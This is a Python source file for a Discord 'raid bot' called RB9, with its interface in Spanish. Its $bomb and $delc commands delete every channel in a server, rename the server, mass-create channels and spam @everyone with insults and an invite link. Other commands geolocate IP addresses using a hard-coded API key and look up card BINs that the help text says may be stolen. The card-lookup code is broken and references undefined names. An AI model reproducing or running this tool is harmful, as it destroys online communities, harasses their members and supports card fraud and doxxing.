import discord
import socket
import time
import os
import ctypes
import requests
from discord.ext import tasks
from discord import user
from discord.ext.commands.bot import Bot
from discord.ext import commands as req
from discord import permissions
from discord.ext.commands import CommandNotFound as req
from discord.ext.commands import MissingRequiredArgument as req
from discord.ext import commands
from optparse import Option
from secrets import choice
from colorama import Fore

VERSION = "1.0"

os.system("mode con: cols=70 lines=21")
ctypes.windll.kernel32.SetConsoleTitleW(f"RB9 RAID BOT | Version {VERSION} |")


bot = commands.Bot(command_prefix="$", intents=discord.Intents(guilds=True, messages=True))
bot.remove_command('help')

TOKEN = ""

os.system("cls")
@bot.event
async def on_ready():
	print(f"""{Fore.RED}########  ########   #######    ########     ###    ########  #### 
##     ## ##     ## ##     ##   ##     ##   ## ##   ##     ##  ##  
##     ## ##     ## ##     ##   ##     ##  ##   ##  ##     ##  ##  
########  ########   ########   ##     ## ##     ## ########   ##  
##   ##   ##     ##        ##   ##     ## ######### ##   ##    ##  
##    ##  ##     ## ##     ##   ##     ## ##     ## ##    ##   ##  
##     ## ########   #######    ########  ##     ## ##     ## #### 
{Fore.RESET}                           CREADO POR JABIG""")
            
   
@bot.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(Title="𝐂𝐎𝐌𝐀𝐍𝐃𝐎 𝐃𝐄 𝐀𝐘𝐔𝐃𝐀", colour = discord.Colour.dark_red())
    embed.set_author(name="🥵🔥🔥𝐑𝐁𝟗 𝐌𝐄𝐍𝐔🔥🔥🥵")
    embed.set_image(url="https://cdn.discordapp.com/attachments/1035395421427748874/1036329173913960608/Picsart_22-10-06_18-39-38-118.jpg")
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/781644861144170496/840335887719596032/tenor.gif")
    embed.add_field(name="``$𝐁𝐎𝐌𝐁``", value="𝐄𝐋𝐈𝐌𝐈𝐍𝐀 𝐋𝐎𝐒 𝐂𝐀𝐍𝐀𝐋𝐄𝐒,𝐇𝐀𝐂𝐄 𝐒𝐏𝐀𝐌 𝐄𝐍 𝐂𝐀𝐃𝐀 𝐃𝐄 𝐋𝐎𝐒 𝐂𝐀𝐍𝐀𝐋𝐄𝐒,𝐂𝐀𝐌𝐁𝐈𝐀 𝐄𝐋 𝐍𝐎𝐌𝐁𝐑𝐄 𝐃𝐄𝐋 𝐒𝐄𝐑𝐕𝐄𝐑", inline=False)
    embed.add_field(name="``$𝐂𝐇𝐄𝐂𝐊𝐁``", value="𝐕𝐄𝐑 𝐋𝐀 𝐈𝐍𝐅𝐎 𝐃𝐄 𝐔𝐍𝐀 𝐓𝐀𝐑𝐉𝐄𝐓𝐀 𝐃𝐄 𝐂𝐑𝐄𝐃𝐈𝐓𝐎 𝐂𝐂 𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐋 𝐎 𝐑𝐎𝐁𝐀𝐃𝐀!! 𝐂𝐎𝐃𝐈𝐆𝐎 𝐏𝐑𝐈𝐕𝐀𝐃𝐎!!" , inline=False)
    embed.add_field(name="``$𝐏𝐈𝐍𝐆``", value="𝐕𝐄𝐑 𝐌𝐒 𝐎 𝐏𝐈𝐍𝐆 𝐃𝐄 𝐔𝐍 𝐒𝐄𝐑𝐕𝐄𝐑 𝐃𝐄 𝐃𝐈𝐒𝐂𝐎𝐑𝐃", inline=False)
    embed.add_field(name="``$𝐆𝐄𝐎𝐈𝐏``", value="𝐋𝐎𝐂𝐀𝐋𝐈𝐙𝐀𝐑 𝐈𝐍𝐅𝐎 𝐃𝐄 𝐔𝐍𝐀 𝐈𝐏 𝐃𝐄𝐍𝐓𝐑𝐎 𝐃𝐄 𝐃𝐈𝐒𝐂𝐎𝐑𝐃!!", inline=False)
    embed.set_footer(text="Byjabibi G")
    await ctx.send(embed=embed)


@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("SERVER PING")
    ping = (time.monotonic() - before) * 1000
    await message.edit(
        content=
        f"💀👽𝐑𝐁𝟗 𝐂𝐇𝐄𝐐𝐔𝐄𝐀𝐍𝐃𝐎 𝐏𝐈𝐍𝐆 `{int(ping)}ms'💀"
    )

@bot.command()
async def geoip(ctx, ip: str):
    await ctx.message.delete()
    r = requests.get(url=f"http://ip-api.com/json/{ip}")
    vpn = requests.get(
        f"https://api.c99.nl/proxydetector?key=MZFG2-EOVK4-TCAB0-4UXP9&ip={ip}"
    ).text.replace("<br>", "\n")
    if vpn == "No proxy detected.":
        vpn = "False"
    else:
        vpn = "True"
    if r.status_code == 200:
        if (r.json()['status'] == "fail"):
            await ctx.send(f"{ip} is an **invalid** IP Address")
        else:
            flag = f":flag_{r.json()['countryCode'].lower()}:"
            embed = discord.Embed(title=f"**{ip}** lookup!",
                                  description=ip,
                                  colour=discord.Colour.random())
            embed.add_field(name="Country",
                            value=f"{flag} {r.json()['country']}",
                            inline=True)
            embed.add_field(
                name="Region",
                value=f"{r.json()['region']} / {r.json()['regionName']}",
                inline=True)
            embed.add_field(name="City",
                            value=f"{r.json()['city']}",
                            inline=True)
            embed.add_field(name="ZIP",
                            value=f"{r.json()['zip']}",
                            inline=True)
            embed.add_field(name="Lat/Long",
                            value=f"{r.json()['lat']}/{r.json()['lon']}",
                            inline=True)
            embed.add_field(name="ISP",
                            value=f"{r.json()['isp']}",
                            inline=True)
            embed.add_field(name="Org",
                            value=f"{r.json()['org']}",
                            inline=True)
            embed.add_field(name="VPN?", value=f"{vpn}", inline=True)
            embed.set_footer(text="Byjabibi G")
            await ctx.send(embed=embed)


@bot.command()
async def checkb(ctx):
    bin = message
    lookup = new_func(bin)
    with urlopen.request(lookup) as url:
        data = json.loads(url.read().decode())

    ### Parse json response
    sch = data["scheme"]
    type = data["type"]
    brand = data["brand"]
    prepd = data["prepaid"]
    country = data["country"]["name"]
    bankname = data["bank"]["name"]
    site = data["bank"]["url"]
    phone = data["bank"]["phone"]
    city = data["bank"]["city"]

    ### Make embed
    embed = discord.Embed(title=bin, color=0xFF0000)
    embed.set_author(name="Bin Lookup for")
    embed.set_thumbnail(url="https://i.imgur.com/E5YiHfL.png")
    embed.add_field(name="===============",
                    value="===============",
                    inline=False)
    embed.add_field(name="Scheme:", value=sch, inline=False)
    embed.add_field(name="Type:", value=type, inline=False)
    embed.add_field(name="Brand:", value=brand, inline=False)
    embed.add_field(name="Prepaid:", value=prepd, inline=False)
    embed.add_field(name="Country:", value=country, inline=False)
    embed.add_field(name="Bank:", value=bankname, inline=False)
    embed.add_field(name="Website:", value=site, inline=False)
    embed.add_field(name="Phone:", value=phone, inline=False)
    embed.add_field(name="City:", value=city, inline=False)
    embed.set_footer(text="Byjabibi G")
    await ctx.send(embed=embed)



@bot.command()
async def bomb(ctx, channel: discord.TextChannel = None, amount: int = 5000):
    await ctx.message.delete()
    guild = ctx.guild
    icon = "https://cdn.discordapp.com/attachments/1035395421427748874/1036329173913960608/Picsart_22-10-06_18-39-38-118.jpg"
    await ctx.guild.edit(name="RB9 AL ATAQUE!!🤬")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.GREEN}CANAL ELIMINADO{Fore.RESET}")
        except: 
            for i in range(amount):     
                await guild.create_text_channel("🔥RB9 YES DARII🔥")
                print(f"{Fore.RED}CANAL {channel.name} CREADO{Fore.RESET}")
                await ctx.send("""\n@everyone▬▬▬▬▬▬▬▬▬
        〘💀〙«⍚°━< R̷B̷9̷ >━°⍚»〘👹〙
                               ▬▬▬▬▬▬▬▬▬

𝐑𝐀𝐏𝐀 𝐓Ú 𝐌𝐀𝐃𝐑𝐄 𝐑𝐄𝐏𝐄𝐓𝐀𝐍 𝐋𝐎𝐒 𝐑𝐁𝟗, 𝐮𝐧𝐭𝐞 𝐚𝐥 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐏𝐚 𝐪𝐮𝐞 𝐚𝐩𝐫𝐞𝐧𝐝𝐚 𝐝𝐞 𝐥𝐨𝐬 𝐩𝐚𝐭𝐫𝐨𝐧𝐞𝐬

𝐅𝐔𝐍𝐃𝐀𝐃𝐎𝐑 | 𝐑𝐃 𝐁𝐮𝐛𝐚𝐥𝐮 
𝐃𝐮𝐞ñ𝐨 | 𝐌𝐈𝐊𝐈-𝟕𝟕 
𝐒𝐔𝐁 𝐃𝐔𝐄Ñ𝐎 | 𝐀𝐛𝐮𝐞𝐥𝐨 𝐌𝐓𝐀
𝐌𝐈 𝐏𝐑𝐎𝐆𝐎𝐌𝐀𝐃𝐎𝐑 | 𝐉𝐚𝐛𝐢𝐛𝐢

ATT 🥷🏻RB9 👹


╔・・・────══╯•💀•╰══────・・・╗
https://cdn.discordapp.com/attachments/1035395421427748874/1036329173913960608/Picsart_22-10-06_18-39-38-118.jpg
https://media.discordapp.net/attachments/781644861144170496/840335887719596032/tenor.gif
https://discord.gg/DddyFqZaQW
╚・・・────══╮•👹️•╭══────・・・╝ 
\n""") 
        guild = ctx.message.guild
        n = 1
        while (n <= 85):    
            await guild.create_text_channel("🔥RB9 YES DARII🔥")
            n = n + 1
    for c in ctx.guild.text_channels:   
        await c.send("@everyone https://discord.gg/DddyFqZaQW ")
        await ctx.guild.edit(name="🔥RB9 YES DADDY!!🔥")
        await guild.create_text_channel("🔥RB9 YES DARII🔥")


    
@bot.command(name='avatar', help='fetch avatar of a user')
async def avatar(ctx, *, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        member = ctx.message.author
    userAvatar = member.avatar_url
    await ctx.send(userAvatar)

@bot.command()
async def delc(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@bot.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def purge(ctx, limit: int, *, user: discord.User = None):
    if user is None:
        user = ctx.author
        server = ctx.message.guild
        await ctx.message.delete()
        embed = discord.Embed(title=f"👽MENSAJES ELIMINADOS SUCCESFULLY POR👽")
        embed.set_author(name=str(user), icon_url=user.avatar_url)
        embed.add_field(name=f"' {user.name} ID:{user.id} '",
                        value="!!MENSAJE ELIMINADO!!",
                        inline=False)
        embed.add_field(name=f"EN EL SERVER:{server.name}",
                        value="👽UN BUEN SERVER👽",
                        inline=False)
        embed.add_field(name=f"{user.name} {user.roles}",
                        value=f"{user.id}",
                        inline=False)
        embed.set_image(url=f"{user.avatar_url}")
        embed.set_footer(text=f"{user.name}>{user.id}")
        await ctx.channel.purge(limit=limit)
        await ctx.channel.send(embed=embed, delete_after=10)


bot.run(TOKEN, bot=True)
